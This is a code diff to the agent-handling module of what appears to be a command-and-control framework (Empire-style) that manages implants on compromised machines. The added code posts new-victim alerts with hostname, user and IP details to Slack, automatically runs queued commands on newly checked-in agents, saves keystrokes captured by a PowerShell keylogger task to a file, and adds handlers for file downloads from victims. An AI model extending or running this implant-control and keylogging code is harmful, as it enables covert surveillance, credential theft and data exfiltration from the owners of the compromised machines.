@@ -55,7 +55,7 @@ handle_agent_data() is the main function that should be used by external listene
 Most methods utilize self.lock to deal with the concurreny issue of kicking off threaded listeners.
 
 """
-
+# -*- encoding: utf-8 -*-
 import os
 import json
 import string
@@ -230,7 +230,7 @@ class Agents:
         parts
 
         # construct the appropriate save path
-        save_path = "%sdownloads/%s%s" % (self.installPath, sessionID, "/".join(parts[0:-1]))
+        save_path = "%sdownloads/%s/%s" % (self.installPath, sessionID, "/".join(parts[0:-1]))
         filename = os.path.basename(parts[-1])
 
         try:
@@ -1041,14 +1041,14 @@ class Agents:
                     if pk is None:
                         pk = 0
                     pk = (pk + 1) % 65536
-                    taskID = cur.execute("INSERT INTO taskings (id, agent, data) VALUES(?, ?, ?)", [pk, sessionID, task[:100]]).lastrowid
+                    cur.execute("INSERT INTO taskings (id, agent, data) VALUES(?, ?, ?)", [pk, sessionID, task[:100]])
 
                     # append our new json-ified task and update the backend
-                    agent_tasks.append([taskName, task, taskID])
+                    agent_tasks.append([taskName, task, pk])
                     cur.execute("UPDATE agents SET taskings=? WHERE session_id=?", [json.dumps(agent_tasks), sessionID])
 
                     # report the agent tasking in the reporting database
-                    cur.execute("INSERT INTO reporting (name,event_type,message,time_stamp,taskID) VALUES (?,?,?,?,?)", (sessionID, "task", taskName + " - " + task[0:50], helpers.get_datetime(), taskID))
+                    cur.execute("INSERT INTO reporting (name,event_type,message,time_stamp,taskID) VALUES (?,?,?,?,?)", (sessionID, "task", taskName + " - " + task[0:50], helpers.get_datetime(), pk))
 
                     cur.close()
 
@@ -1058,7 +1058,7 @@ class Agents:
                         f.write(task)
                         f.close()
                     
-                    return taskID
+                    return pk
 
                 finally:
                     self.lock.release()
@@ -1180,6 +1180,7 @@ class Agents:
             try:
                 message = encryption.aes_decrypt_and_verify(stagingKey, encData)
             except Exception as e:
+                print 'exception e:' + str(e)
                 # if we have an error during decryption
                 dispatcher.send("[!] HMAC verification failed from '%s'" % (sessionID), sender='Agents')
                 return 'ERROR: HMAC verification failed'
@@ -1291,18 +1292,18 @@ class Agents:
 
                 dispatcher.send("[!] Nonce verified: agent %s posted valid sysinfo checkin format: %s" % (sessionID, message), sender='Agents')
 
-                # listener = parts[1].encode('ascii', 'ignore')
-                domainname = parts[2].encode('ascii', 'ignore')
-                username = parts[3].encode('ascii', 'ignore')
-                hostname = parts[4].encode('ascii', 'ignore')
-                external_ip = clientIP.encode('ascii', 'ignore')
-                internal_ip = parts[5].encode('ascii', 'ignore')
-                os_details = parts[6].encode('ascii', 'ignore')
-                high_integrity = parts[7].encode('ascii', 'ignore')
-                process_name = parts[8].encode('ascii', 'ignore')
-                process_id = parts[9].encode('ascii', 'ignore')
-                language = parts[10].encode('ascii', 'ignore')
-                language_version = parts[11].encode('ascii', 'ignore')
+                listener = unicode(parts[1], 'utf-8')
+                domainname = unicode(parts[2], 'utf-8')
+                username = unicode(parts[3], 'utf-8')
+                hostname = unicode(parts[4], 'utf-8')
+                external_ip = unicode(clientIP, 'utf-8')
+                internal_ip = unicode(parts[5], 'utf-8')
+                os_details = unicode(parts[6], 'utf-8')
+                high_integrity = unicode(parts[7], 'utf-8')
+                process_name = unicode(parts[8], 'utf-8')
+                process_id = unicode(parts[9], 'utf-8')
+                language = unicode(parts[10], 'utf-8')
+                language_version = unicode(parts[11], 'utf-8')
                 if high_integrity == "True":
                     high_integrity = 1
                 else:
@@ -1320,10 +1321,17 @@ class Agents:
             # update the agent with this new information
             self.mainMenu.agents.update_agent_sysinfo_db(sessionID, listener=listenerName, internal_ip=internal_ip, username=username, hostname=hostname, os_details=os_details, high_integrity=high_integrity, process_name=process_name, process_id=process_id, language_version=language_version, language=language)
 
-            # signal everyone that this agent is now active
-            dispatcher.send("[+] Initial agent %s from %s now active" % (sessionID, clientIP), sender='Agents')
-            output = "[+] Agent %s now active:\n" % (sessionID)
-
+            # signal to Slack that this agent is now active
+            
+            slackToken = listenerOptions['SlackToken']['Value']
+            slackChannel = listenerOptions['SlackChannel']['Value']
+            if slackToken != "":
+                slackText = ":biohazard: NEW AGENT :biohazard:\r\n```Machine Name: %s\r\nInternal IP: %s\r\nExternal IP: %s\r\nUser: %s\r\nOS Version: %s\r\nAgent ID: %s```" % (hostname,internal_ip,external_ip,username,os_details,sessionID)
+                helpers.slackMessage(slackToken,slackChannel,slackText)
+            
+	        # signal everyone that this agent is now active
+            dispatcher.send("[+] Initial agent %s from %s now active (Slack)" % (sessionID, clientIP), sender='Agents')
+	    
             # save the initial sysinfo information in the agent log
             agent = self.mainMenu.agents.get_agent_db(sessionID)
             output = messages.display_agent(agent, returnAsString=True)
@@ -1334,6 +1342,20 @@ class Agents:
             autorun = self.get_autoruns_db()
             if autorun and autorun[0] != '' and autorun[1] != '':
                 self.add_agent_task_db(sessionID, autorun[0], autorun[1])
+
+            if self.mainMenu.autoRuns.has_key(language.lower()) and len(self.mainMenu.autoRuns[language.lower()]) > 0:
+                autorunCmds = ["interact %s" % sessionID]
+                autorunCmds.extend(self.mainMenu.autoRuns[language.lower()])
+                autorunCmds.extend(["lastautoruncmd"])
+                self.mainMenu.resourceQueue.extend(autorunCmds)
+                try:
+                    #this will cause the cmdloop() to start processing the autoruns
+                    self.mainMenu.do_agents("kickit")
+                except Exception as e:
+                    if e.message == "endautorun":
+                        pass
+                    else:
+                        raise e
 
             return "STAGE2: %s" % (sessionID)
 
@@ -1391,7 +1413,6 @@ class Agents:
 
         TODO: does this need self.lock?
         """
-
         if sessionID not in self.agents:
             dispatcher.send("[!] handle_agent_request(): sessionID %s not present" % (sessionID), sender='Agents')
             return None
@@ -1409,6 +1430,7 @@ class Agents:
             # build tasking packets for everything we have
             for tasking in taskings:
                 task_name, task_data, res_id = tasking
+
                 all_task_packets += packets.build_task_packet(task_name, task_data, res_id)
 
             # get the session key for the agent
@@ -1456,9 +1478,16 @@ class Agents:
                 self.process_agent_packet(sessionID, responseName, taskID, data)
                 results = True
 
+            conn = self.get_db_connection()
+            cur = conn.cursor()      
+            data = cur.execute("SELECT data FROM taskings WHERE agent=? AND id=?", [sessionID,taskID]).fetchone()[0]
+            cur.close()
+            theSender="Agents"
+            if data.startswith("function Get-Keystrokes"):
+		        theSender += "PsKeyLogger"
             if results:
                 # signal that this agent returned results
-                dispatcher.send("[*] Agent %s returned results." % (sessionID), sender='Agents')
+                dispatcher.send("[*] Agent %s returned results." % (sessionID), sender=theSender)
 
             # return a 200/valid
             return 'VALID'
@@ -1480,6 +1509,7 @@ class Agents:
         """
 
         agentSessionID = sessionID
+        keyLogTaskID = None
 
         # see if we were passed a name instead of an ID
         nameid = self.get_agent_id_db(sessionID)
@@ -1504,6 +1534,10 @@ class Agents:
                     pk = (pk + 1) % 65536
                     cur.execute("INSERT INTO results (id, agent, data) VALUES (?,?,?)",(pk, sessionID, data))
                 else:
+                    try:
+                        keyLogTaskID = cur.execute("SELECT id FROM taskings WHERE agent=? AND data LIKE \"function Get-Keystrokes%\"", [sessionID]).fetchone()[0]
+                    except Exception as e:
+                        pass
                     cur.execute("UPDATE results SET data=data||? WHERE id=? AND agent=?", [data, taskID, sessionID])
 
         finally:
@@ -1529,17 +1563,17 @@ class Agents:
             else:
                 print "sysinfo:",data
                 # extract appropriate system information
-                listener = parts[1].encode('ascii', 'ignore')
-                domainname = parts[2].encode('ascii', 'ignore')
-                username = parts[3].encode('ascii', 'ignore')
-                hostname = parts[4].encode('ascii', 'ignore')
-                internal_ip = parts[5].encode('ascii', 'ignore')
-                os_details = parts[6].encode('ascii', 'ignore')
-                high_integrity = parts[7].encode('ascii', 'ignore')
-                process_name = parts[8].encode('ascii', 'ignore')
-                process_id = parts[9].encode('ascii', 'ignore')
-                language = parts[10].encode('ascii', 'ignore')
-                language_version = parts[11].encode('ascii', 'ignore')
+                listener = unicode(parts[1], 'utf-8')
+                domainname = unicode(parts[2], 'utf-8')
+                username = unicode(parts[3], 'utf-8')
+                hostname = unicode(parts[4], 'utf-8')
+                internal_ip = unicode(parts[5], 'utf-8')
+                os_details = unicode(parts[6], 'utf-8')
+                high_integrity = unicode(parts[7], 'utf-8')
+                process_name = unicode(parts[8], 'utf-8')
+                process_id = unicode(parts[9], 'utf-8')
+                language = unicode(parts[10], 'utf-8')
+                language_version = unicode(parts[11], 'utf-8')
                 if high_integrity == 'True':
                     high_integrity = 1
                 else:
@@ -1569,7 +1603,7 @@ class Agents:
 
         elif responseName == "TASK_EXIT":
             # exit command response
-
+            data = "[!] Agent %s exiting" % (sessionID)
             # let everyone know this agent exited
             dispatcher.send(data, sender='Agents')
 
@@ -1607,6 +1641,19 @@ class Agents:
                 msg = "file download: %s, part: %s" % (path, index)
                 self.save_agent_log(sessionID, msg)
 
+        elif responseName == "TASK_GETDOWNLOADS":
+            if not data or data.strip().strip() == "":
+                data = "[*] No active downloads"
+
+            self.update_agent_results_db(sessionID, data)
+            #update the agent log
+            self.save_agent_log(sessionID, data)
+
+        elif responseName == "TASK_STOPDOWNLOAD":
+            # download kill response
+            self.update_agent_results_db(sessionID, data)
+            #update the agent log
+            self.save_agent_log(sessionID, data)
 
         elif responseName == "TASK_UPLOAD":
             pass
@@ -1675,11 +1722,23 @@ class Agents:
 
 
         elif responseName == "TASK_CMD_JOB":
+	    #check if this is the powershell keylogging task, if so, write output to file instead of screen
+            if keyLogTaskID and keyLogTaskID == taskID:
+                safePath = os.path.abspath("%sdownloads/" % self.mainMenu.installPath)
+                savePath = "%sdownloads/%s/keystrokes.txt" % (self.mainMenu.installPath,sessionID)
+                if not os.path.abspath(savePath).startswith(safePath):
+                    dispatcher.send("[!] WARNING: agent %s attempted skywalker exploit!" % (self.sessionID), sender='Agents')
+                    return
 
-            # dynamic script output -> non-blocking
-            self.update_agent_results_db(sessionID, data)
-            # update the agent log
-            self.save_agent_log(sessionID, data)
+                with open(savePath,"a+") as f:
+                    new_results = data.replace("\r\n","").replace("[SpaceBar]", "").replace('\b', '').replace("[Shift]", "").replace("[Enter]\r","\r\n")
+                    f.write(new_results)
+            else:
+                # dynamic script output -> non-blocking
+                self.update_agent_results_db(sessionID, data)
+
+                # update the agent log
+                self.save_agent_log(sessionID, data)
 
             # TODO: redo this regex for really large AD dumps
             #   so a ton of data isn't kept in memory...?
@@ -1744,6 +1803,7 @@ class Agents:
             self.save_agent_log(sessionID, data)
 
         elif responseName == "TASK_SCRIPT_COMMAND":
+            
             self.update_agent_results_db(sessionID, data)
             # update the agent log
             self.save_agent_log(sessionID, data)
